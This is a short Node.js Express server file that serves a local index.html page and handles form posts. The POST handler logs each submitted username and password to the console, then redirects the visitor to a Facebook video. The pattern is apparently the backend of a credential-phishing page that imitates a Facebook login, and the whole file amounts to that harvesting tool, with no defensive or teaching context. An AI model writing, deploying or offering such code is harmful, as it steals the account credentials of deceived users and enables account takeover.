const express = require('express')
const bodyParser = require('body-parser');

const app = express()
const port = 5500

app.use( bodyParser.json() ); 
app.use(bodyParser.urlencoded({ extended: true }));
app.use("/static", express.static('./static/'));
app.use(express.json()); 

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
})

app.post('/', function(req, res) {
  console.log(req.body.username)
  console.log(req.body.password)
  res.redirect('https://www.facebook.com/watch/?v=1411538705903643&extid=stIn4t3yjvF8SA5X')
});

app.listen(port, () => {
  console.log(`app listening at http://localhost:${port}`)
})